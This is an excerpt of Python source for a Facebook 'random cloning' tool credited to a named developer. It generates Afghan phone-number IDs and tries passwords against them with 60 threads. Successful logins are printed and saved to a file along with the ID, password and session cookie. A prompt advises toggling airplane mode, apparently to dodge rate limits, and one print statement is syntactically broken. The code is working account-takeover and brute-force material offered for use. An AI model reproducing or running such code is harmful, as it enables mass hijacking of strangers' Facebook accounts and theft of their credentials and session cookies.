...
logo=("""
  \33[1;92m.d8b.  .88b  d88. d88888b d88888b d8888b. 
 \33[1;92md8' `8b 88'YbdP`88 88'     88'     88  `8D 
 \33[1;92m88ooo88 88  88  88 88ooooo 88ooooo 88oobY' 
 \33[1;92m88~~~88 88  88  88 88~~~~~ 88~~~~~ 88`8b   
 \33[1;92m88   88 88  88  88 88.     88.     88 `88. 
 \33[1;92mYP   YP YP  YP  YP Y88888P Y88888P 88   YD 
                                           
                                           


\33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║  \x1b[97m\033[37;41m Welcome to my AMEER Tools       \033[0;m  ║
\33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║  \x1b[97m\033[37;41m  FREE AFG RANDOM CLONING V1.0 \033[0;m    ║
\33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
\33[1;92m║➣\033[1;91m DEVOLPER   :          AMEER BIBAK \33[1;92m║
\33[1;92m║➣ FACEBOOK   :          AMEER BIBAK \33[1;92m║
\33[1;92m║➣\033[1;93m WHATSAPP   :          +93798759228        \33[1;92m ║
\33[1;92m║➣\033[1;34m GITHUB     :          Ameer-000007         \33[1;92m ║
\33[1;92m║➣\033[1;35m TOOLS      :          AFG RANDOM CRACKING \33[1;92m ║ 
\33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
""")
...
def Main():
	...
	if opt in ["B","2"]:
		admin()
	if opt in ["C","3"]:
		os.system('xdg-open https://www.facebook.com/Ameer.Bibak007');time.sleep(1)
		fb()
	if opt in ["D","4"]:
		os.system('xdg-open https://wa.me/+93798759228');time.sleep(1)
		group()
	if opt in ["0","0"]:
		exit()
...
def admin():
	...
	if bal =='2':
		...
		admin()
	if bal =='3':
		os.system('xdg-open https://t.me/amir_007_Tech');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def virusA():
	...
	os.system('clear')
	print(logo)
	print(" ┏━[•] AFG SIM CODE 9378 9379 9377 9370 9376 9372]")
	kode = input(' ┗━[+] SELECT : ')
	doamin = ' AFG Number id cloner [ONLY-OK] '
	print(' ┏━[•] EXAMPLE : 2000,5000,10000,15000,20000] ')
	...
	with ThreadPool(max_workers=60) as yaari:
		...
		print('┗━[•] START AFG UID MIXT CRACKING... ')
		print('┗━[•]  Befor Clone Id Airlplane mode Of , On)
        print(50*'━')
		for guru in user:
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mAMEER\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [AMR-💚] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m=[💙]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/AMR ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
